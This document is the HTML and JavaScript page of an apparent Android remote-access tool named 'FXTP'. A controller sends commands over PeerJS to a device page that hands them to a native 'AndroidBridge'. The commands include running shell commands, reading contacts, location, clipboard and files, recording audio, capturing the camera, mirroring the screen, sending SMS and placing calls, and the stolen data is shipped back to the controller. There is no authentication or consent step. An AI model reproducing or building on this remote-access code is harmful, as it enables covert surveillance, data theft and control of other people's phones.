<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>FXTP</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: #0a0a12; color: #e0e0ff; padding: 16px; min-height: 100vh; }
        .header { background: linear-gradient(135deg, #1a1a2e, #16213e); border-radius: 20px; padding: 20px; margin-bottom: 16px; border: 1px solid #2a2a42; }
        .header h1 { font-size: 24px; font-weight: 700; background: linear-gradient(135deg, #a855f7, #3b82f6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-align: center; }
        .mode-selector { display: flex; gap: 10px; margin: 12px 0; }
        .mode-selector button { flex: 1; padding: 12px; border: 2px solid #2a2a3a; border-radius: 12px; background: transparent; color: #e0e0ff; font-weight: 600; cursor: pointer; transition: 0.3s; font-size: 16px; }
        .mode-selector button.active { border-color: #7c5cfc; background: #7c5cfc33; }
        .mode-selector button.device-mode.active { border-color: #00f0ff; background: #00f0ff22; }
        .mode-selector button.controller-mode.active { border-color: #ff00ff; background: #ff00ff22; }
        .card { background: #14141e; border-radius: 16px; padding: 16px; margin-bottom: 16px; border: 1px solid #2a2a3a; }
        .card-title { font-size: 13px; color: #8a8a9e; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px; }
        .id-box { background: #0b0b12; padding: 12px; border-radius: 10px; text-align: center; word-break: break-all; font-family: monospace; border: 1px solid #2a2a3a; }
        .status { color: #ffb74d; font-weight: 600; text-align: center; margin: 8px 0; }
        .status.connected { color: #4caf50; }
        .input-group { display: flex; gap: 10px; flex-wrap: wrap; }
        .input-group input { flex: 1; background: #0b0b12; border: 1px solid #2a2a3a; border-radius: 10px; padding: 12px 16px; color: #e0e0ff; font-size: 14px; outline: none; min-width: 120px; }
        .input-group input:focus { border-color: #7c5cfc; }
        .btn { background: #2a2a3e; border: none; color: #e0e0ff; padding: 10px 16px; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; transition: 0.2s; border: 1px solid transparent; }
        .btn:active { transform: scale(0.96); }
        .btn-primary { background: #7c5cfc; color: #fff; }
        .btn-primary:hover { background: #6a4ae0; }
        .btn-success { background: #2e7d32; color: #fff; }
        .btn-success:hover { background: #1b6b22; }
        .btn-danger { background: #e94560; color: #fff; }
        .btn-danger:hover { background: #d43a56; }
        .btn-outline { background: transparent; border-color: #3a3a52; }
        .btn-outline:hover { background: #2a2a3e; }
        .btn-sm { padding: 6px 12px; font-size: 12px; }
        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
        .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; }
        .log { background: #0b0b12; border-radius: 12px; padding: 12px; height: 120px; overflow-y: auto; font-family: 'Fira Code', monospace; font-size: 11px; line-height: 1.6; border: 1px solid #2a2a3a; white-space: pre-wrap; word-break: break-all; }
        .log .time { color: #6a6a82; }
        .log .sent { color: #4caf50; }
        .log .received { color: #ffb74d; }
        .log .error { color: #e94560; }
        .log .info { color: #8a8a9e; }
        .mirror-container { width: 100%; min-height: 200px; background: #0b0b12; border-radius: 12px; border: 1px solid #2a2a3a; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .mirror-container img { max-width: 100%; max-height: 400px; object-fit: contain; }
        .mirror-container .placeholder { color: #6a6a82; font-size: 14px; padding: 20px; text-align: center; }
        @media (max-width: 480px) { .grid-3 { grid-template-columns: 1fr 1fr; } }
    </style>
</head>
<body>

    <div class="header">
        <h1>⚡ FXTP</h1>
    </div>

    <div class="mode-selector">
        <button class="device-mode active" id="btnDeviceMode" onclick="setMode('device')">📱 Device</button>
        <button class="controller-mode" id="btnControllerMode" onclick="setMode('controller')">🎮 Controller</button>
    </div>

    <!-- Device Panel -->
    <div id="devicePanel">
        <div class="card">
            <div class="card-title">📡 Device Listener</div>
            <div class="id-box" id="peerIdDisplay">Initializing...</div>
            <div class="status" id="statusDisplay">⏳ Waiting for connection...</div>
        </div>
    </div>

    <!-- Controller Panel -->
    <div id="controllerPanel" style="display:none;">
        <div class="card">
            <div class="card-title">📡 Connect</div>
            <div class="input-group">
                <input id="targetPeerId" placeholder="Device Peer ID" />
                <button class="btn btn-success" onclick="connectToPeer()">Connect</button>
                <button class="btn btn-danger" onclick="disconnect()">Disconnect</button>
            </div>
            <div class="status" id="ctrlStatus">🔴 Disconnected</div>
        </div>

        <!-- Mirror Display -->
        <div class="card">
            <div class="card-title">🖥️ Mirror (Full‑screen)</div>
            <div class="mirror-container" id="mirrorBox">
                <img id="mirrorImage" style="display:none; max-height:400px;" />
                <span class="placeholder" id="mirrorPlaceholder">Mirror will appear here<br><small>Click the image to expand full‑screen</small></span>
            </div>
        </div>

        <div class="card">
            <div class="card-title">🎮 Actions</div>
            <div class="grid-3">
                <button class="btn btn-primary" onclick="sendCmd('screenshot')">📸 Screenshot</button>
                <button class="btn btn-primary" onclick="sendCmd('start_mirror')">🖥️ Mirror</button>
                <button class="btn btn-danger" onclick="sendCmd('stop_mirror')">⏹️ Stop</button>
            </div>
            <div class="grid-2" style="margin-top:8px;">
                <button class="btn btn-outline" onclick="sendCmd('get_clipboard')">📋 Get Clipboard</button>
                <button class="btn btn-outline" onclick="sendCmd('device_info')">📱 Info</button>
            </div>
        </div>

        <div class="card">
            <div class="card-title">⚙️ Advanced</div>
            <div class="grid-2">
                <button class="btn btn-outline btn-sm" onclick="promptCmd('launch_app','Package:')">🚀 Launch</button>
                <button class="btn btn-outline btn-sm" onclick="promptCmd('list_files','Path:','/sdcard')">📂 List</button>
                <button class="btn btn-outline btn-sm" onclick="promptCmd('download_file','File path:')">⬇️ Download</button>
                <button class="btn btn-outline btn-sm" onclick="promptCmd('shell','Command:')">💻 Shell</button>
                <button class="btn btn-outline btn-sm" onclick="promptCmdSms()">📩 SMS</button>
                <button class="btn btn-outline btn-sm" onclick="sendCmd('contacts')">👤 Contacts</button>
                <button class="btn btn-outline btn-sm" onclick="sendCmd('location')">📍 Location</button>
                <button class="btn btn-outline btn-sm" onclick="sendCmd('wifi')">📶 WiFi</button>
            </div>
            <div style="margin-top:10px; display:flex; gap:6px; flex-wrap:wrap;">
                <button class="btn btn-outline btn-sm" onclick="sendCmd('flashlight',true)">🔦 On</button>
                <button class="btn btn-outline btn-sm" onclick="sendCmd('flashlight',false)">🔦 Off</button>
                <button class="btn btn-outline btn-sm" onclick="promptCmd('vibrate','Duration ms:','1000')">📳 Vibrate</button>
                <button class="btn btn-outline btn-sm" onclick="promptCmd('brightness','Brightness 0-100:','50')">☀️ Bright</button>
                <button class="btn btn-outline btn-sm" onclick="promptCmd('volume','Volume 0-100:','50')">🔊 Volume</button>
            </div>
            <div style="margin-top:10px;">
                <button class="btn btn-primary btn-sm" onclick="sendCmd('lock')">🔒 Lock</button>
                <button class="btn btn-primary btn-sm" onclick="promptCmd('html','HTML:','<h1 style=\"color:#00f0ff;\">FXTP</h1>')">📄 HTML</button>
                <button class="btn btn-outline btn-sm" onclick="promptCmd('call','Phone:')">📞 Call</button>
                <button class="btn btn-outline btn-sm" onclick="promptCmd('download_url','URL:')">⬇️ Download URL</button>
                <button class="btn btn-outline btn-sm" onclick="sendCmd('camera')">📷 Camera</button>
                <button class="btn btn-outline btn-sm" onclick="promptCmd('audio','Duration sec:','5')">🎤 Audio</button>
                <button class="btn btn-outline btn-sm" onclick="sendCmd('packages')">📦 Packages</button>
            </div>
        </div>
    </div>

    <!-- Log -->
    <div class="card">
        <div class="card-title">📋 Log</div>
        <div class="log" id="log">Ready.</div>
    </div>

    <script>
        // ========================================
        // STATE
        // ========================================
        let peer = null, connection = null, myId = '', currentMode = 'device', isConnected = false;

        function log(msg, type = 'info') {
            const el = document.getElementById('log');
            const time = new Date().toLocaleTimeString();
            const colors = { sent: 'sent', received: 'received', error: 'error', info: 'info' };
            el.innerHTML += `<span class="time">[${time}]</span> <span class="${colors[type] || 'info'}">${msg}</span>\n`;
            el.scrollTop = el.scrollHeight;
        }

        // ========================================
        // MODE SWITCH
        // ========================================
        function setMode(mode) {
            currentMode = mode;
            document.getElementById('btnDeviceMode').classList.toggle('active', mode === 'device');
            document.getElementById('btnControllerMode').classList.toggle('active', mode === 'controller');
            document.getElementById('devicePanel').style.display = mode === 'device' ? 'block' : 'none';
            document.getElementById('controllerPanel').style.display = mode === 'controller' ? 'block' : 'none';
            if (mode === 'device') initDevice();
            else if (!peer) initPeer();
        }

        // ========================================
        // DEVICE MODE
        // ========================================
        function initDevice() {
            if (peer) { peer.destroy(); peer = null; connection = null; }
            peer = new Peer();
            peer.on('open', (id) => {
                myId = id;
                document.getElementById('peerIdDisplay').textContent = 'Peer ID: ' + id;
                log('🔑 Device ready: ' + id, 'info');
            });
            peer.on('connection', (conn) => {
                connection = conn;
                isConnected = true;
                document.getElementById('statusDisplay').textContent = '✅ Connected';
                document.getElementById('statusDisplay').className = 'status connected';
                log('✅ Device connected!', 'info');
                conn.on('data', (data) => {
                    log('📩 Received: ' + JSON.stringify(data), 'received');
                    handleCommand(data);
                });
                conn.on('close', () => {
                    isConnected = false;
                    document.getElementById('statusDisplay').textContent = '🔴 Disconnected';
                    document.getElementById('statusDisplay').className = 'status';
                    log('🔌 Disconnected.', 'info');
                    connection = null;
                });
            });
            peer.on('error', (err) => { log('❌ Peer error: ' + err.message, 'error'); });
        }

        // ========================================
        // HANDLE COMMAND (Device)
        // ========================================
        function handleCommand(data) {
            const type = data.type;
            if (type === 'ping') { if (connection) connection.send({ type: 'pong', value: 'alive' }); return; }
            const map = {
                'screenshot': 'takeScreenshot',
                'start_mirror': 'startMirror',
                'stop_mirror': 'stopMirror',
                'shell': 'runShell',
                'launch_app': 'launchApp',
                'list_files': 'listFiles',
                'download_file': 'downloadFile',
                'notification': 'sendNotification',
                'clipboard': 'setClipboard',
                'get_clipboard': 'getClipboard',
                'sms': 'sendSms',
                'contacts': 'getContacts',
                'location': 'getLocation',
                'camera': 'captureCamera',
                'audio': 'startAudioRecording',
                'device_info': 'getDeviceInfo',
                'packages': 'getPackages',
                'wifi': 'scanWifi',
                'flashlight': 'toggleFlashlight',
                'vibrate': 'vibrate',
                'brightness': 'setBrightness',
                'volume': 'setVolume',
                'download_url': 'downloadFromUrl',
                'call': 'makeCall',
                'lock': 'startLockScreen',
                'html': 'displayHtml'
            };
            const method = map[type];
            if (!method) { if (connection) connection.send({ type: 'error', value: 'Unknown: ' + type }); return; }
            if (typeof AndroidBridge !== 'undefined' && typeof AndroidBridge[method] === 'function') {
                try {
                    let result;
                    if (data.value !== undefined) result = AndroidBridge[method](data.value);
                    else result = AndroidBridge[method]();
                    if (result !== undefined && connection) connection.send({ type: method + '_result', value: result });
                    else if (connection) connection.send({ type: method + '_result', value: 'ok' });
                } catch (e) {
                    if (connection) connection.send({ type: 'error', value: 'Exception: ' + e.message });
                }
            } else {
                if (connection) connection.send({ type: 'error', value: 'Method not found: ' + method });
            }
        }

        // ========================================
        // CONTROLLER MODE
        // ========================================
        function initPeer() {
            if (peer) return;
            peer = new Peer();
            peer.on('open', (id) => { myId = id; log('🔑 Controller ready: ' + id, 'info'); });
            peer.on('connection', (conn) => {
                connection = conn; isConnected = true;
                document.getElementById('ctrlStatus').textContent = '✅ Connected';
                document.getElementById('ctrlStatus').style.color = '#4caf50';
                log('✅ Connected!', 'info');
                conn.on('data', (data) => { log('📩 Received: ' + JSON.stringify(data), 'received'); handleResponse(data); });
                conn.on('close', () => {
                    isConnected = false;
                    document.getElementById('ctrlStatus').textContent = '🔴 Disconnected';
                    document.getElementById('ctrlStatus').style.color = '#ffb74d';
                    log('🔌 Disconnected.', 'info');
                    connection = null;
                });
            });
            peer.on('error', (err) => { log('❌ Peer error: ' + err.message, 'error'); });
        }

        function connectToPeer() {
            const target = document.getElementById('targetPeerId').value.trim();
            if (!target) { log('❌ Enter Peer ID.', 'error'); return; }
            if (!peer) initPeer();
            const conn = peer.connect(target);
            conn.on('open', () => {
                connection = conn; isConnected = true;
                document.getElementById('ctrlStatus').textContent = '✅ Connected to ' + target;
                document.getElementById('ctrlStatus').style.color = '#4caf50';
                log('✅ Connected to ' + target, 'info');
                conn.on('data', (data) => { log('📩 Received: ' + JSON.stringify(data), 'received'); handleResponse(data); });
                conn.on('close', () => {
                    isConnected = false;
                    document.getElementById('ctrlStatus').textContent = '🔴 Disconnected';
                    document.getElementById('ctrlStatus').style.color = '#ffb74d';
                    log('🔌 Disconnected.', 'info');
                    connection = null;
                });
            });
            conn.on('error', (err) => { log('❌ Connection error: ' + err.message, 'error'); });
        }

        function disconnect() {
            if (connection) { connection.close(); connection = null; isConnected = false; }
            document.getElementById('ctrlStatus').textContent = '🔴 Disconnected';
            document.getElementById('ctrlStatus').style.color = '#ffb74d';
            log('🔌 Disconnected manually.', 'info');
        }

        function sendCmd(type, value) {
            if (!isConnected || !connection) { log('❌ Not connected.', 'error'); return; }
            const payload = { type };
            if (value !== undefined) payload.value = value;
            connection.send(payload);
            log('📤 Sent: ' + type + (value !== undefined ? ' (' + value + ')' : ''), 'sent');
        }

        function promptCmd(type, label, def) {
            const val = prompt(label, def || '');
            if (val !== null) sendCmd(type, val);
        }

        function promptCmdSms() {
            const num = prompt('Phone number:');
            if (!num) return;
            const msg = prompt('SMS message:');
            if (msg) sendCmd('sms', num + '|' + msg);
        }

        // ========================================
        // HANDLE RESPONSE (Controller)
        // ========================================
        function handleResponse(data) {
            const type = data.type;
            const val = data.value;

            // Mirror frames – display in the image element
            if (type === 'mirror_frame') {
                const img = document.getElementById('mirrorImage');
                const placeholder = document.getElementById('mirrorPlaceholder');
                img.src = 'data:image/png;base64,' + val;
                img.style.display = 'block';
                placeholder.style.display = 'none';
                // Allow full‑screen expansion
                img.onclick = function() {
                    if (document.fullscreenEnabled) {
                        const container = document.getElementById('mirrorBox');
                        container.requestFullscreen().catch(() => {});
                    } else {
                        window.open('data:image/png;base64,' + val, '_blank');
                    }
                };
                return;
            }

            if (type === 'screenshot_data' || type === 'camera_data') {
                const win = window.open('', '_blank');
                if (win) {
                    win.document.write('<img src="data:image/png;base64,' + val + '" style="max-width:100%;" />');
                    win.document.title = type === 'screenshot_data' ? 'Screenshot' : 'Camera';
                } else {
                    log('📷 ' + (type === 'screenshot_data' ? 'Screenshot' : 'Camera') + ' received', 'received');
                }
                return;
            }

    if (type === 'file_data') {
                log('📁 File data received', 'received');
                const a = document.createElement('a');
                a.href = 'data:application/octet-stream;base64,' + val;
                a.download = 'downloaded_file.bin';
                a.click();
                return;
            }

            if (type === 'audio_data') {
                log('🎤 Audio data received', 'received');
                const a = document.createElement('a');
                a.href = 'data:audio/3gpp;base64,' + val;
                a.download = 'audio.3gp';
                a.click();
                return;
            }

            // Other responses
            if (type === 'file_list') {
                try { const arr = JSON.parse(val); log('📂 ' + arr.map(f => f.name + (f.isDir ? '/' : '')).join(', '), 'received'); } catch { log('📂 ' + val, 'received'); }
            } else if (type === 'shell_result') {
                log('💻 ' + val, 'received');
            } else if (type === 'device_info') {
                try { const info = JSON.parse(val); log('📱 ' + Object.entries(info).map(([k, v]) => k + ': ' + v).join(' | '), 'received'); } catch { log('📱 ' + val, 'received'); }
            } else if (type === 'contacts') {
                try { const arr = JSON.parse(val); log('👤 ' + arr.map(c => c.name + ' (' + c.number + ')').join('; '), 'received'); } catch { log('👤 ' + val, 'received'); }
            } else if (type === 'wifi') {
                try { const arr = JSON.parse(val); log('📶 ' + arr.map(w => w.ssid + ' (' + w.rssi + 'dBm)').join('; '), 'received'); } catch { log('📶 ' + val, 'received'); }
            } else if (type === 'location') {
                log('📍 ' + val, 'received');
            } else if (type === 'packages') {
                log('📦 ' + val, 'received');
            } else if (type === 'error') {
                log('❌ Error: ' + val, 'error');
            } else if (type.endsWith('_result')) {
                log('✅ ' + type.replace('_result', '') + ': ' + val, 'received');
            } else {
                log('📩 ' + type + ': ' + val, 'received');
            }
        }

        // ========================================
        // START
        // ========================================
        setMode('device');
    </script>
</body>
</html>
